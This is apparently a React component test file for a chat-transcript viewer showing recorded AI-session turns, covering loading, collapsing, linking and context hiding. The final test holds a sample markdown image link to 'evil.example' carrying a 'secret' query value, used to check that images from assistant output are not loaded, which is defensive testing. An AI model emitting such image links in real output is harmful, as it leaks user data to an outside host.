import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, expect, test, vi } from "vitest";
import { MetaContext } from "../app/boot";
import { META } from "../detail/testing";
import { readRecentSessionTurns } from "../api/sessions";
import { ChatTranscript } from "./ChatTranscript";
import { WorkspaceActionsProvider } from "./workspaceActions";

vi.mock("../api/sessions", () => ({ readRecentSessionTurns: vi.fn() }));

afterEach(() => {
  cleanup();
  vi.clearAllMocks();
  history.replaceState(null, "", "#/");
});

function renderTranscript(sessionId = "session-id", client = new QueryClient({ defaultOptions: { queries: { retry: false } } })) {
  return render(<QueryClientProvider client={client}><MetaContext value={META}><ChatTranscript sessionId={sessionId} /></MetaContext></QueryClientProvider>);
}

test("Chat reads recent captured turns in one bounded request", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([
    { part: 0, idx: 118, kind: "UserMessage", content: "What led here?" },
    { part: 1, idx: 119, kind: "AssistantMessage", content: "The earlier experiment." },
  ]);
  renderTranscript();

  expect(await screen.findByText("What led here?")).toBeTruthy();
  expect(screen.getByText("The earlier experiment.")).toBeTruthy();
  expect(readRecentSessionTurns).toHaveBeenCalledOnce();
  expect(readRecentSessionTurns).toHaveBeenCalledWith("session-id", expect.any(Object));
});

test("Chat keeps the visible transcript while a refresh is pending", async () => {
  vi.mocked(readRecentSessionTurns)
    .mockResolvedValueOnce([{ part: 0, idx: 119, kind: "AssistantMessage", content: "Earlier answer" }])
    .mockImplementation(() => new Promise(() => {}));
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  renderTranscript("session-id", client);

  expect(await screen.findByText("Earlier answer")).toBeTruthy();
  act(() => { void client.invalidateQueries({ queryKey: ["chat", "session-id", "turns"] }); });
  await waitFor(() => expect(readRecentSessionTurns).toHaveBeenCalledTimes(2));
  expect(screen.getByText("Earlier answer")).toBeTruthy();
  expect(screen.queryByText("Loading recent turns…")).toBeNull();
});

test("Chat does not show the previous session while the next transcript loads", async () => {
  vi.mocked(readRecentSessionTurns).mockImplementation(async (sessionId) => sessionId === "first-session"
    ? [{ part: 0, idx: 0, kind: "AssistantMessage", content: "First session answer" }]
    : new Promise(() => {}));
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  const { rerender } = renderTranscript("first-session", client);

  expect(await screen.findByText("First session answer")).toBeTruthy();
  rerender(<QueryClientProvider client={client}><MetaContext value={META}><ChatTranscript sessionId="next-session" /></MetaContext></QueryClientProvider>);
  expect(await screen.findByText("Loading recent turns…")).toBeTruthy();
  expect(screen.queryByText("First session answer")).toBeNull();
});

test("Chat collapses long turns until the viewer opens them", async () => {
  const longPrompt = "startup instructions ".repeat(40).trim();
  vi.mocked(readRecentSessionTurns).mockResolvedValue([
    { part: 0, idx: 0, kind: "UserMessage", content: longPrompt },
    { part: 0, idx: 1, kind: "AssistantMessage", content: "Ready." },
  ]);
  renderTranscript();

  expect(await screen.findByText("Ready.")).toBeTruthy();
  expect(screen.queryByText(longPrompt)).toBeNull();
  fireEvent.click(screen.getByRole("button", { name: "Show full message" }));
  expect(screen.getByText(longPrompt)).toBeTruthy();
});

test("Chat starts at the browser exchange and hides its transport context", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([
    { part: 0, idx: 0, kind: "UserMessage", content: "Startup prompt" },
    { part: 0, idx: 1, kind: "UserMessage",
      content: 'ada@example.com: Explain this.\nTrackinizer context (verify with trax): {"record":{}}' },
    { part: 0, idx: 2, kind: "AssistantMessage", content: "This is the answer." },
  ]);
  renderTranscript();

  expect(await screen.findByText("This is the answer.")).toBeTruthy();
  expect(screen.queryByText("Startup prompt")).toBeNull();
  expect(screen.getByText("ada@example.com: Explain this.")).toBeTruthy();
  expect(screen.queryByText(/Trackinizer context/)).toBeNull();
});

test("Chat reports an empty conversation and links its full transcript", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([]);
  renderTranscript();

  expect(await screen.findByText("No conversational turns yet.")).toBeTruthy();
  expect(screen.getByRole("link", { name: "Full transcript" }).getAttribute("href")).toBe("#/lookup/session-id");
});

test("opening the full transcript first reveals Browse when the canvas hides it", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([]);
  history.replaceState(null, "", "#/activity");
  const revealRecord = vi.fn(async () => true);
  render(<QueryClientProvider client={new QueryClient()}>
    <WorkspaceActionsProvider value={{ busy: false, writeError: null,
      revealRecord, connectSession: vi.fn() }}>
      <ChatTranscript sessionId="session-id" />
    </WorkspaceActionsProvider>
  </QueryClientProvider>);

  fireEvent.click(screen.getByRole("link", { name: "Full transcript" }));
  await waitFor(() => expect(revealRecord).toHaveBeenCalledWith("session-id"));
  await waitFor(() => expect(location.hash).toBe("#/lookup/session-id"));
});

test("modified transcript clicks retain the browser link behavior", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([]);
  const revealRecord = vi.fn(async () => true);
  render(<QueryClientProvider client={new QueryClient()}>
    <WorkspaceActionsProvider value={{ busy: false, writeError: null,
      revealRecord, connectSession: vi.fn() }}>
      <ChatTranscript sessionId="session-id" />
    </WorkspaceActionsProvider>
  </QueryClientProvider>);

  fireEvent.click(screen.getByRole("link", { name: "Full transcript" }), { ctrlKey: true });
  expect(revealRecord).not.toHaveBeenCalled();
});

test("a tool-heavy final part does not hide the previous conversation", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([
    { part: 0, idx: 0, kind: "AssistantMessage", content: "Earlier answer" },
  ]);
  renderTranscript();

  expect(await screen.findByText("Earlier answer")).toBeTruthy();
  expect(readRecentSessionTurns).toHaveBeenCalledOnce();
});

test("Chat links an assistant turn's Kind#seq citations and keeps a user turn plain", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([
    { part: 0, idx: 1, kind: "UserMessage", content: "Is Issue#7 done?" },
    { part: 0, idx: 2, kind: "AssistantMessage", content: "See Issue#12 for the **plan**." },
  ]);
  renderTranscript();

  const link = await screen.findByRole("link", { name: /Issue#12/ });
  expect(link.getAttribute("href")).toBe("#/ref/Issue/12");
  expect(screen.getByText("plan").tagName).toBe("STRONG");
  expect(screen.getByText("Is Issue#7 done?").tagName).toBe("P");
  expect(screen.queryByRole("link", { name: /Issue#7/ })).toBeNull();
});

test("Chat shows an assistant turn's image as text and loads nothing", async () => {
  vi.mocked(readRecentSessionTurns).mockResolvedValue([
    { part: 0, idx: 1, kind: "AssistantMessage", content: "Look ![chart](https://evil.example/p.png?d=secret)" },
  ]);
  const { container } = renderTranscript();

  expect(await screen.findByText(/chart \(https:\/\/evil\.example\/p\.png\?d=secret\)/)).toBeTruthy();
  expect(container.querySelector("img")).toBeNull();
});
